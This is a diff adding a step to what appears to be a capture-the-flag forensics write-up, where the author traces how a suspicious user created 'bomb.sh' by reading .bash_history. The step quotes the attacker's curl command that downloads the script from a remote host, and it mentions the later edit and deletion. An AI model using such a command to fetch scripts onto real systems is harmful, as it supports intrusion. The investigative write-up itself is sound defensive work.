@@ -120,3 +120,21 @@ To identify which files were accessed or modified by the attacker using text edi
 
 #### Answer
 bomb.sh
+
+### 6. That bomb.sh file is a huge red flag! What is the command used that created the file bomb.sh?
+
+#### Method
+Since the `bomb.sh` file was no longer present on the file system, I investigated the command history to determine its origin. 
+1. I navigated to the home directory of the suspicious user `it-admin` and inspected their `.bash_history` file.
+2. The history revealed that the user utilized the `curl` command to download the script from a remote server (`10.10.158.38`) on port `8080`.
+3. The command included the `--output` flag, which saved the downloaded content directly as `bomb.sh`.
+4. The history also confirms the subsequent use of `sudo vi bomb.sh` and the final deletion of the file using `rm bomb.sh` to hide evidence.
+
+**Command discovered in .bash_history:**
+`curl 10.10.158.38:8080/bomb.sh --output bomb.sh`
+
+**Screenshot:**
+<img width="645" height="187" alt="image" src="https://github.com/user-attachments/assets/6e9683a5-a377-46d1-8478-d2eab279e736" />
+
+#### Answer
+curl 10.10.158.38:8080/bomb.sh --output bomb.sh
